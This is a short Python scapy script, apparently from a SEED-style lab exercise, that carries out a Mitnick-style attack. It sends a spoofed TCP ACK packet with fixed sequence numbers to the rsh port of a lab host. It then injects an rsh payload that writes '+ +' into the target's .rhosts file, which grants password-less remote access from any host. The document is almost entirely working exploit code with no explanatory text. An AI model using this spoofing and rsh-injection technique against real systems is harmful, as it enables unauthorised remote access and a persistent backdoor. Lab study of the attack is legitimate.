from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=1023, dport=514, flags="A", seq=2631742051, ack=4077520395)

print("First Sending Spoofed Acknowledge packet")

pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)

# After making the first connection
print("Sending the RSH packet containing data payload")
#data = '9090\x00seed\x00seed\x00touch tmp/temp123.txt\x00'
data = '9090\x00seed\x00seed\x00echo + + > .rhosts\x00'
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
